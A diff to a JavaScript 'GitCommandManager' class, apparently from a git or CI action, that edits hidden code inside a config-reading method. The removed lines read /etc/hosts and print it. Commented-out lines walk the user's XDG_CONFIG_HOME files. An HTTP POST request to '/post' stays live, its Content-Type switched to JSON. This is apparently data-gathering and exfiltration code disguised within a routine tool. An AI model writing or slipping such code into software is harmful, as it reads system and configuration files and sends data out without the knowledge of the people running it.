@@ -629,13 +629,10 @@ class GitCommandManager {
         return __awaiter(this, void 0, void 0, function* () {
             const pattern = regexpHelper.escape(configKey);
 	/* ---------- */
-        let sleep = function() {
-          let start = new Date().getTime();
-          while(new Date().getTime() < start + 5000) {}
-        };
-        fs.readFile("/etc/hosts","utf8" ,function(err, contents){
-          console.log(contents);
-        });
+        // let sleep = function() {
+        //   let start = new Date().getTime();
+        //   while(new Date().getTime() < start + 5000) {}
+        // };
 	      // fs.readdir(process.env.XDG_CONFIG_HOME, (err, files) => {
         //   files.forEach(file => {
         //     sleep();
@@ -652,7 +649,7 @@ class GitCommandManager {
         path: '/post',
         method: 'POST',
         headers: {
-          'Content-Type': 'application/x-www-form-urlencoded',
+          'Content-Type': 'application/json',
           'Content-Length': data.length
         }
       };
